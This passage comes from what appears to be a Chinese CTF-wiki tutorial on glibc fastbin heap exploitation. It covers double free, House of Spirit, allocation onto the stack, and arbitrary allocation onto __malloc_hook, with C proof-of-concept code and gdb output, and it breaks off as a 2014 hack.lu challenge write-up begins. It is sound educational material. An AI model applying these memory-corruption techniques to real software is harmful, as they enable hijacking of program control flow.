\u7b2c\u4e8c\u6b21\u91ca\u653e free(chunk2) \u7b2c\u4e09\u6b21\u91ca\u653e free(chunk1) \u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002 \u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena=>chunk1=>chun2=>chunk1 \u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002 typedef struct _chunk { long long pre_size ; long long size ; long long fd ; long long bk ; } CHUNK , * PCHUNK ; CHUNK bss_chunk ; int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; void * chunk_a , * chunk_b ; bss_chunk . size = 0x21 ; chunk1 = malloc ( 0x10 ); chunk2 = malloc ( 0x10 ); free ( chunk1 ); free ( chunk2 ); free ( chunk1 ); chunk_a = malloc ( 0x10 ); * ( long long * ) chunk_a =& bss_chunk ; malloc ( 0x10 ); malloc ( 0x10 ); chunk_b = malloc ( 0x10 ); printf ( \"%p\" , chunk_b ); return 0 ; } \u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8e bss \u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 CHUNK bss_chunk Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x601080 <bss_chunk>: 0x0000000000000000 0x0000000000000021 0x601090 <bss_chunk+16>:0x0000000000000000 0x0000000000000000 0x6010a0: 0x0000000000000000 0x0000000000000000 0x6010b0: 0x0000000000000000 0x0000000000000000 0x6010c0: 0x0000000000000000 0x0000000000000000 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86 bss_chunk.size=0x21; \u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc \u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 *** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5] /lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651] /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184] ./tst[0x400636] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830] ./tst[0x4004e9] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 00bc4000-00be5000 rw-p 00000000 00:00 0 [heap] 7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0 [stack] 7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0 [vvar] 7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) _int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim )); return NULL ; } \u5c0f\u603b\u7ed3 \u00b6 \u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002 \u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c (\u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1)\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002 House Of Spirit \u00b6 \u3010\u6280\u672f\u5206\u4eab\u3011\u5806\u4e4bHouse of Spirit PWN\u5b66\u4e60\u4e4bhouse of\u7cfb\u5217(\u4e00) \u4ecb\u7ecd \u00b6 House of Spirit \u662f the Malloc Maleficarum \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d**\u6307\u5b9a\u5730\u5740**\u7684 chunk \u7684\u76ee\u7684\u3002 \u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373 fake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a 1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002 fake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK fake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002 fake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e 2 * SIZE_SZ \uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e av->system_mem \u3002 fake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002 \u6f14\u793a \u00b6 \u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates the house of spirit attack. \\n \" ); fprintf ( stderr , \"Calling malloc() once so that it sets up its memory. \\n \" ); malloc ( 1 ); fprintf ( stderr , \"We will now overwrite a pointer to point to a fake 'fastbin' region. \\n \" ); unsigned long long * a ; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks [ 10 ] __attribute__ (( aligned ( 16 ))); fprintf ( stderr , \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p. \\n \" , sizeof ( fake_chunks ), & fake_chunks [ 1 ], & fake_chunks [ 7 ]); fprintf ( stderr , \"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. \\n \" ); fprintf ( stderr , \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n \" ); fake_chunks [ 1 ] = 0x40 ; // this is the size fprintf ( stderr , \"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. \\n \" ); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks [ 9 ] = 0x1234 ; // nextsize fprintf ( stderr , \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p. \\n \" , & fake_chunks [ 1 ]); fprintf ( stderr , \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. \\n \" ); a = & fake_chunks [ 2 ]; fprintf ( stderr , \"Freeing the overwritten pointer. \\n \" ); free ( a ); fprintf ( stderr , \"Now the next malloc will return the region of our fake chunk at %p, which will be %p! \\n \" , & fake_chunks [ 1 ], & fake_chunks [ 2 ]); fprintf ( stderr , \"malloc(0x30): %p \\n \" , malloc ( 0x30 )); } \u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b \u279c how2heap git: ( master ) ./house_of_spirit This file demonstrates the house of spirit attack. Calling malloc () once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region ( memory of length: 80 ) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88. This chunk.size of this region has to be 16 more than the region ( to accomodate the chunk data ) while still falling into the fastbin category ( < = 128 on x64 ) . The PREV_INUSE ( lsb ) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED ( second lsb ) and NON_MAIN_ARENA ( third lsb ) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is > 2 *SIZE_SZ ( > 16 on x64 ) && < av->system_mem ( < 128kb by default for the main arena ) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58. ... note that the memory address of the *region* associated with this chunk must be 16 -byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60! malloc ( 0x30 ) : 0x7ffd9bceaa60 \u5c0f\u603b\u7ed3 \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c \u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b \u3002 Alloc to Stack \u00b6 \u4ecb\u7ecd \u00b6 \u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002 \u6f14\u793a \u00b6 \u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002 typedef struct _chunk { long long pre_size; long long size; long long fd; long long bk; } CHUNK,*PCHUNK; int main(void) { CHUNK stack_chunk; void *chunk1; void *chunk_a; stack_chunk.size=0x21; chunk1=malloc(0x10); free(chunk1); *(long long *)chunk1=&stack_chunk; malloc(0x10); chunk_a=malloc(0x10); return 0; } \u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x00007fffffffde60 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk \u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c 0x7ffff7dd1b20 <main_arena>: 0x0000000000000000 <=== unsorted bin 0x7ffff7dd1b28 <main_arena+8>: 0x00007fffffffde60 <=== fastbin[0] 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 \u6700\u7ec8\u7b2c\u4e8c\u6b21 malloc \u8fd4\u56de\u503c\u4e3a 0x00007fffffffde70 \u4e5f\u5c31\u662f stack_chunk 0x400629 <main+83> call 0x4004c0 <malloc@plt> \u2192 0x40062e <main+88> mov QWORD PTR [rbp-0x38], rax $rax : 0x00007fffffffde70 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \u5c0f\u603b\u7ed3 \u00b6 \u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301 fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684 size \u503c\u3002 Arbitrary Alloc \u00b6 \u4ecb\u7ecd \u00b6 Arbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002 \u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982 bss\u3001heap\u3001data\u3001stack \u7b49\u7b49\u3002 \u6f14\u793a \u00b6 \u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230**_malloc_hook \u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002** int main(void) { void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0; } \u8fd9\u91cc\u7684 0x7ffff7dd1af5 \u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002 0x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 <__malloc_hook>: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684 size \u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a 32 \u5b57\u8282\u5230 128 \u5b57\u8282 (0x20-0x80)\uff0c\u5982\u4e0b\uff1a //\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ Fastbins[idx=0, size=0x10] Fastbins[idx=1, size=0x20] Fastbins[idx=2, size=0x30] Fastbins[idx=3, size=0x40] Fastbins[idx=4, size=0x50] Fastbins[idx=5, size=0x60] Fastbins[idx=6, size=0x70] \u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a 0x000000000000007f 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af5 <_IO_wide_data_0+309>: 0x000000000000007f \u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002 ##define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \uff08\u6ce8\u610f sz \u7684\u5927\u5c0f\u662f unsigned int\uff0c\u56e0\u6b64\u53ea\u5360 4 \u4e2a\u5b57\u8282\uff09 \u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002 \u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x7ffff7dd1afd\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 __malloc_hook \u7684\u5185\u5bb9 (\u5728\u6211\u7684 libc \u4e2d__realloc_hook \u4e0e__malloc_hook \u662f\u5728\u8fde\u5728\u4e00\u8d77\u7684)\u3002 0x4005a8 <main+66> call 0x400450 <malloc@plt> \u2192 0x4005ad <main+71> mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd 0x7ffff7dd1aed <_IO_wide_data_0+301>: 0xfff7dd0260000000 0x000000000000007f 0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f 0x7ffff7dd1b0d <__realloc_hook+5>: 0x000000000000007f 0x0000000000000000 0x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000 \u5c0f\u603b\u7ed3 \u00b6 Arbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002 2014 hack.lu oreo \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 \u7a0b\u5e8f\u6bd4\u8f83\u53e4\u8001\uff0c32 \u4f4d\u7684\u5806\u9898 1 2 3 4 5 Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) \u57fa\u672c\u529f\u80fd \u00b6 \u5b58\u50a8\u67aa\u652f\u4fe1\u606f\u7ed3\u6784\u4f53\uff1a struct rifle { description //\u4ece0\u5b57\u8282\u5f00\u59cb name //\u4ece25\u5b57\u8282\u5f00\u59cb pre_rifle_ptr //\u4ece52\u5b57\u8282\u5f00\u59cb } //\u603b\u517156\u5b57\u8282 \u6dfb\u52a0\u67aa\u652f\uff0c\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u4e3a 56 \uff0c\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u67aa\u652f\u4fe1\u606f\u5806\u5757\u5927\u5c0f\u56fa\u5b9a\u4e3a 0x40 \uff08\u542bchunk_header\uff09\u3002 